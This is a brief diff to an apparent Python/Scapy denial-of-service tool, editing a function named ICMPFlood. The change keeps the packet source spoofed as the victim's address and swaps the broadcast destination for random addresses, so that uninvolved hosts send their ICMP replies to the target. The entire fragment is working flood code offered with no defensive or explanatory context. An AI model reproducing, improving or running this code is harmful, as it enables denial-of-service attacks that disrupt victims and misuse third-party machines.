@@ -116,7 +116,8 @@ def ICMPFlood(dstIP,dstPort,repeat):
     for x in range(repeat):
         IP_Packet = IP()
         IP_Packet.src = dstIP
-        IP_Packet.dst = "255.255.255.255"
+        IP_Packet.dst = randomSrcIP()
+        IP_Packet.proto='icmp'
         ICMP_Packet = ICMP()
         send(IP_Packet/ICMP())
 
